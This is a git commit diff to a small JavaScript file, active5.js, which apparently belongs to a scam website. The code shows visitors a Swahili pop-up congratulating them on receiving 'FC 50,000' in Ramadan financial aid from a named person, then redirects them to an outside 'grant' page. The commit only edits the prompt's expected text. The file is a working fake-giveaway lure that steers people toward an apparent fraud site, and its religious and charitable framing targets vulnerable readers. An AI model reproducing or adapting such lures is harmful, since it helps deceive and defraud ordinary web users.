30d663c7aa7dfe6856aad849cf14537145666698
The-On-going <sirpeelawson@gmail.com>
2026-03-16 16:36:46 +0100

    Update active5.js

--- active5.js
+++ active5.js
@@ -1,10 +1,10 @@
-var password = 'TOA FC 50,000';
+var password = 'FC 50,000';
 
 password = prompt(
   'Hongera, unastahili kupata MELAINE DESTON GAVET ELENGO FC 50,000 Msaada wa Fedha wa Ramadhani. Bonyeza OK kupokea mara moja.',
-  'TOA FC 50,000'
+  'FC 50,000'
 );
 
-if (password !== 'TOA FC 50,000') {
+if (password !== 'FC 50,000') {
     location.href = 'https://ongoing-grant.info/Msaada-Wa-Ramadhani.html';
 }
